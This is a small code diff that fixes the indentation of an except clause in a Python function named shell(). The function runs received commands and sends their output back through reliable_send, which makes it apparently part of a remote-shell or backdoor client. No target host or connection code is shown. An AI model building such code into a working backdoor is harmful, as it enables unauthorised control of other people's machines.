@@ -356,7 +356,7 @@ def shell():
                 result = execute.stdout + execute.stderr
                 result = result.decode()
                 reliable_send(result)
-             except:
+            except:
                 pass
                 
         elif command == 'env':
